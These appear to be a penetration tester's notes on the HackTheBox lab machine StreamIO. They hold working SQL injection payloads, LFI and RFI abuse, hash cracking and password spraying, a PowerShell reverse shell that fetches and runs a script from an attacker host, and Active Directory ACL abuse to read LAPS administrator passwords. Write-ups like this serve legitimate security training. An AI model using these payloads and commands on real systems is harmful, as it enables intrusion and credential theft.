## Takeaway
- When determining the number of columns of the result set of previous `SELECT` statement for `UNION SQLi`. It's best the previous result set is empty so that no type-mismatching happens.
	- `nonexisting' union select 1,2,3,4,5,6--`

## Metadata
- `nmap` will identify a few potential virtual site being `streamio.htb` and `watch.streamio.htb`. Add them to `/etc/hosts`.
- Navigate to `https://watch.streamio.htb/` to locate the site. Running `feroxbuster -u https://watch.streamio.htb/  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  -x "txt,php" -t 10 -k -e -r` will identify a  search page at `https://watch.streamio.htb/search.php` vulnerable to `SQLi`.
	- Searching for `%` will collect all the movies since the backend is potentially running a query like `select * from movies where name like '%query%'`.
	- Runing a `Union` query nonexisting'+union+select+1,2,3,4,5,6--)`will further confirm that it is vulnerable to `SQLi`.
	- ![[Pasted image 20240310131103.png]]
	- Exfiltrate current database with `nonexisting'+union+select+1,db_name(),3,4,5,6--` as `streamio`.![[Pasted image 20240310141337.png]]
	- Exfiltrate current database tables with `nonexisting'+union+select+1,(SELECT+STRING_AGG(name,+',+')+FROM+streamio..sysobjects+WHERE+xtype+%3d+'U'),3,4,5,6--`.![[Pasted image 20240310141505.png]]
	- Exfiltrate columns of `users` table with `nonexisting'+union+select+1,(SELECT+STRING_AGG(name,+',+')+FROM+syscolumns+WHERE+id+%3d+(SELECT+id+FROM+sysobjects+WHERE+name+%3d+'users')),3,4,5,6--`![[Pasted image 20240310141902.png]]
	- Exfiltrate all users that are staff along with there passwords with `nonexisting'+union+select+1,(SELECT+STRING_AGG(concat(username,'%3a',password),+'%0d%0a')+FROM+users),3,4,5,6--` and `cat creds.txt | awk '{print $1""$2}' > creds.txt` to get a organized file.
	- Run `hashcat -m 0 --username creds.txt /usr/share/wordlists/rockyou.txt --force` to obtain potential users.
		- ![[Pasted image 20240310144403.png]]
- Run `cat cracked.txt | awk -F: '{print $1}' > users.txt` and `cat cracked.txt | awk -F: '{print $3}' > passwords.txt` to generate the files for spraying.
	- Spraying against the host directly has no luck but there is a login page at `https://streamio.htb/login.php`.
	- Run `hydra -C spray.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"` to find valid credential `yoshihide:66boysandgirls..`![[Pasted image 20240310150129.png]]
- After login one is able to visit the previous `unauthorized` page `https://streamio.htb/admin/index.php`.
	-  Use `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://streamio.htb/admin/index.php?FUZZ= -H 'Cookie: PHPSESSID=plljm5e3lj3tten6m3nlqi1867' -fs 1678` to fuzz for potential `GET` parameter and find `debug` parameter.![[Pasted image 20240310204239.png]]
	- The `debug` parameter has a `LFI` vulnerability.![[Pasted image 20240310204533.png]]
- Exfiltrate `master.php` and `index.php` using php filter to further analyze.
	- `https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=index.php`
	- Same for `master.php`
	- Within `index.php`, `MSSQL Credential`: `db_admin: B1@hx31234567890`![[Pasted image 20240310205620.png]]
	- Looking at `master.php`, one can identify a `RFI`.![[Pasted image 20240310211849.png]]
- As `streamio\yoshihide`, we can use previous found `mssql` credential `db_admin: B1@hx31234567890` to further enumerate users.
	- Run `sqlcmd -U db_admin -P B1@hx31234567890 -q "SELECT concat(username, ':', password) from streamio_backup..users"` to locate more credentials.
	- Run `hashcat -m 0 cred2.txt /usr/share/wordlists/rockyou.txt --username --force` to crack for plaintext passwords.![[Pasted image 20240310230736.png]]
	- The only non-repeating credential is `nikk37:get_dem_girls2@yahoo.com`. Spray using `netexec`, one can identify that new credential is valid and has access to the host using `winrm`.![[Pasted image 20240310231156.png]]
- `winpeas` as `streamio\nikk37` will identify potential `Firefox DBs`.![[Pasted image 20240310232359.png]]
	- Download `logins.json` and `key4.db` at  `C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\profiles\br53rxeg.default-release` and use `firepwd`(https://github.com/lclevy/firepwd) to retrieve credentials.
		- Run `python3 firepwd.py -d ../`![[Pasted image 20240310233700.png]]
		- `JDgodd:JDg0dd1s@d0p3cr3@t0r` seems like promising pair. Run `netexec` to confirm validity.
# Exploitation
## Shell as yoshihide
- Generate a reverse shell payload.
```shell
# No '<?php ?>' since directly passed to eval()
system("powershell.exe -nop -w hidden -c iex(iwr http://10.10.14.23/Windows/nishang/Shells/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.23 443");
```
- Set up python Web Server at port `123` and send the following request in `burp` to receive a reverse shell as `streamio\yoshihide`.![[Pasted image 20240310212032.png]]
## Shell as nikk37
- Run `evil-winrm -i 10.10.11.158 -u nikk37  -p get_dem_girls2@yahoo.com` to obtain an interactive session.![[Pasted image 20240310234057.png]]
# PrivEsc
- Run bloodhound will identify that `JDGODD` has `WriteOwner` privilege to `CORE STAFF` whose members can read `LAPS` passwords for obtain local administration access.![[Pasted image 20240310234435.png]]
- Load `PowerView` and run following script to add `JDGGOD` to` CORE STAFF`.
```shell
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Credential $Cred -Identity "CORE STAFF" -OwnerIdentity 'JDgodd'
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity 'JDgodd'
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Credential $Cred
Get-DomainGroupMember -Identity 'CORE STAFF'
```
- Adding `10.10.11.158 DC.streamIO.htb` to `/etc/hosts` and rune `netexec ldap 10.10.11.158 -u JDgodd -p JDg0dd1s@d0p3cr3@t0r --kdcHost 10.10.11.158 -M laps` to retrieve local administrator password as `9cL[408pU3CEXV`. ![[Pasted image 20240311001631.png]]![[Pasted image 20240311001828.png]]
- Run `evil-winrm -i 10.10.11.158 -u administrator  -p 9cL[408pU3CEXV`
